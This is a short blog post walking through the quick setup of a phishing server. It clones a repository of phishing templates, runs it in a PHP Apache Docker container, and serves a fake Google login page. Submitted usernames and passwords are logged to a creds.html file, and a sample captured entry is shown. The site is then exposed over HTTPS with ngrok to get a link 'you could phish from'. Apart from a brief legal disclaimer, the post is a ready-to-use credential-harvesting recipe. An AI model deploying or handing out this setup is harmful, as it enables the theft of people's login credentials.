---
title: 'Fly Phishing'
slug: fly-phishing
date: 2020-01-13
autotoc: true
excerpt: true
layout: post.html
collection: all, linux, security, phishing
---

This article will walk through setting up a phishing server on the fly. 

**This is only legal to do with written permission from an organization or user. I am not liable for this information being misuse and I do not endorse illegal activity using these methods.**

## Quick Setup:

```bash
git clone https://github.com/heywoodlh/lokis-portal.git ~/Documents/lokis-portal
sudo chown -R 33:33 ~/Documents/lokis-portal/
docker run -d --name lokis-portal -p 80:80 -v "$HOME"/Documents/lokis-portal:/var/www/html php:7-apache-buster
```
</br>


Notice the change of ownership to user ID and group to 33. This is the user/group of the `www-data` user for the `php:7-apache-buster` Docker container and that user will need permission to write to `creds.html`.


![alt text](https://raw.githubusercontent.com/heywoodlh/the-empire.systems/master/resources/pictures/google-phishing.png "Google Phishing Page")


The Google phishing page will be available at [http://localhost/google/](http://localhost/google). The [root directory](http://localhost) has a list of the templates that are available for phishing with. At the time of writing only the Google phishing page is working, but maybe future me will be proactive and build out/fix the rest of the templates.

The phishing templates are available [at Github](https://github.com/heywoodlh/lokis-portal). Feel free to reuse them as needed.

### Get Creds:

When running the command above, a file called `creds.html` will be accessible in `~/Documents/lokis-portal/creds.html`. Whenever a login occurs, that file will populate with logs. For example:

```bash
2020-01-13 11:52:25pm: accounts.google.com: 172.17.0.1 --- testing --- password --- Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
```
</br>



### Serve Via HTTPS:

Use Ngrok or a reverse proxy to easily serve the web page via HTTPS. For example, with Ngrok:

```bash
ngrok http 80
```
</br>
This will provide you with an HTTPS link that you could phish from.
